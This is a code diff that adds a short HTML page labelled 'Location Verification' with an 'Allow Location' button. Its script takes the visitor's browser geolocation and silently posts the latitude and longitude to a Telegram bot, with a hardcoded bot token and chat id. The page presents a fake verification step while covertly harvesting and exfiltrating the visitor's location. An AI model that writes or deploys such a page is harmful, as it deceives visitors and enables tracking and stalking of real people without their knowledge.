@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<body style="text-align:center;font-family:sans-serif">
+<h2>Location Verification</h2>
+<button onclick="getLocation()">Allow Location</button>
+
+<script>
+function getLocation() {
+  navigator.geolocation.getCurrentPosition(sendLocation);
+}
+
+function sendLocation(pos) {
+  var lat = pos.coords.latitude;
+  var lon = pos.coords.longitude;
+
+  fetch("https://api.telegram.org/bot8032728319:AAERv5p9V2XF0f_q3B8T-DVmLhxDb6NnjB0/sendMessage", {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({
+      chat_id: "8215590469",
+      text: "📍 Location Received:\nLat: " + lat + "\nLon: " + lon
+    })
+  });
+}
+</script>
+</body>
+</html>
